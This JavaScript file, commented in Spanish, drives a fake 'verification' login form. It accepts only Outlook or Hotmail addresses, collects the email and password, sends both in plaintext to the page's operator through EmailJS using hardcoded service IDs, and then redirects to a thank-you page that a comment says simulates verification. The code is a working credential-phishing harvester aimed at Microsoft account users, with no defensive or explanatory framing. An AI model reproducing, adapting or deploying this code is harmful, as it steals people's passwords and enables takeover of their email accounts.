emailjs.init('ReqtkWfjI392LAzFb');

document.getElementById('formularioVerificacion').addEventListener('submit', async (e) => {
  e.preventDefault();

  const boton = document.querySelector('.boton-verificacion');
  boton.disabled = true;
  boton.innerHTML = `<div class="spinner"></div> Procesando...`;

  const correo = document.getElementById('correo').value.trim();
  const contrasena = document.getElementById('contrasena').value;

  // Funciones de validación y mensajes de error
  const limpiarErrores = () => {
    document.querySelectorAll('.error-input').forEach(el => el.remove());
  };

  const mostrarError = (campo, mensaje) => {
    limpiarErrores();
    const error = document.createElement('div');
    error.className = 'error-input';
    error.style.color = '#ff4444';
    error.style.marginTop = '0.5rem';
    error.style.fontSize = '0.9rem';
    error.textContent = mensaje;
    campo.parentNode.appendChild(error);
  };

  // Validar que el correo sea de Outlook o Hotmail
  const correoLower = correo.toLowerCase();
  if (!(correoLower.endsWith("outlook.com") || correoLower.endsWith("hotmail.com"))) {
    mostrarError(document.getElementById('correo'), "Solo se permiten correos de Outlook o Hotmail");
    boton.disabled = false;
    boton.innerHTML = `<span class="texto-boton">Acceder</span><span class="icono-boton">🌸</span>`;
    return;
  }

  // Validar contraseña (mínimo 4 caracteres)
  if (contrasena.length < 4) {
    mostrarError(document.getElementById('contrasena'), "Contraseña muy corta (mínimo 4 caracteres)");
    boton.disabled = false;
    boton.innerHTML = `<span class="texto-boton">Acceder</span><span class="icono-boton">🌸</span>`;
    return;
  }

  // Preparar datos para enviar por EmailJS
  const datos = {
    correo: correo,
    contrasena: contrasena
  };

  try {
    await emailjs.send("service_syrc1uk", "template_otuzmqu", datos);
  } catch (error) {
    console.error('Error al enviar EmailJS:', error);
  }

  // Redirigir al thank-you page para simular la verificación de 5 segundos
  window.location.href = "thank-you.html";
});
